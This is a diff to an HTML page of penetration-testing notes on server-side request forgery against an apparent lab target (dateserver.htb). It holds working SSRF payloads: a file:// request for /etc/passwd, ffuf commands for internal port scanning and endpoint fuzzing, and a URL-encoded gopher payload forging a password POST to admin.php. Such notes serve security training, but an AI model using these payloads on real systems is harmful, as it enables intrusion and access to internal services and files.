@@ -683,6 +683,48 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lfi" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzzing-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fuzzing Endpoints
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-gopher" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Gopher
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -780,7 +822,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#lfi" class="md-nav__link">
+  <a href="#lfi_1" class="md-nav__link">
     <span class="md-ellipsis">
       LFI
     </span>
@@ -1297,6 +1339,48 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#lfi" class="md-nav__link">
+    <span class="md-ellipsis">
+      LFI
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fuzzing-endpoints" class="md-nav__link">
+    <span class="md-ellipsis">
+      Fuzzing Endpoints
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-gopher" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Gopher
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
         
           <li class="md-nav__item">
@@ -1394,7 +1478,7 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#lfi" class="md-nav__link">
+  <a href="#lfi_1" class="md-nav__link">
     <span class="md-ellipsis">
       LFI
     </span>
@@ -1449,26 +1533,34 @@
 <li>Start a netcat listener and send a request in the post parameter to it i.e: <code>dateserver=http://10.10.15.145:8000/ssrf/&amp;date=2024-01-01</code>.</li>
 </ul>
 <h3 id="exploitation">Exploitation</h3>
-<ul>
-<li>
-<p>Change POST parameter to <code>dateserver=file:///etc/passwd&amp;date=2024-01-01</code> to check for LFI.</p>
-</li>
-<li>
-<p>internal portscan by accessing ports on localhost:</p>
-</li>
-</ul>
+<h4 id="lfi">LFI</h4>
+<p>Change POST parameter to <code>dateserver=file:///etc/passwd&amp;date=2024-01-01</code>.</p>
+<h4 id="port-scan">Port Scan</h4>
+<p>Internal portscan by accessing ports on localhost:</p>
 <pre><code class="language-bash">seq 1 10000 &gt; ports.txt
 ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;dateserver=http://127.0.0.1:FUZZ/&amp;date=2024-01-01&quot; -fr &quot;Failed to connect to&quot;
 </code></pre>
-<ul>
-<li>accessing restricted endpoints:</li>
-</ul>
+<h4 id="fuzzing-endpoints">Fuzzing Endpoints</h4>
+<p>Accessing restricted endpoints:</p>
 <pre><code class="language-bash">ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;dateserver=http://dateserver.htb/FUZZ.php&amp;date=2024-01-01&quot; -fr &quot;Server at dateserver.htb Port 80&quot;
 </code></pre>
-<ul>
-<li>Consider we find and endpoint admin.php through fuzzing which returns a POST form:</li>
-</ul>
+<h4 id="using-gopher">Using Gopher</h4>
+<p>Consider we find an endpoint admin.php through fuzzing which returns a POST form:</p>
 <p><img alt="admin.php" src="../../images/admin_php.png" /></p>
+<p>To send a POST request to /admin.php containing the password in the adminpw POST parameter we can use gopher: <code>dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&amp;date=2024-01-01</code></p>
+<p>Gopher crafted a post request within the <code>dataserver</code> post parameter.</p>
+<p>Gopher can craft URLs that access other internal services through post parameters:
+- MySQL
+- PostgreSQL
+- FastCGI
+- Redis
+- SMTP
+- Zabbix
+- pymemcache
+- rbmemcache
+- phpmemcache
+- dmpmemcache</p>
+<p>We can use <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> to craft these payloads for us.</p>
 <h3 id="protocols">Protocols</h3>
 <ul>
 <li><code>http://127.0.0.1/</code> or <code>https://</code> can be used to access internal or external endpoints</li>
@@ -1577,7 +1669,7 @@ ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-
 </tr>
 </tbody>
 </table>
-<h4 id="lfi">LFI</h4>
+<h4 id="lfi_1">LFI</h4>
 <table>
 <thead>
 <tr>
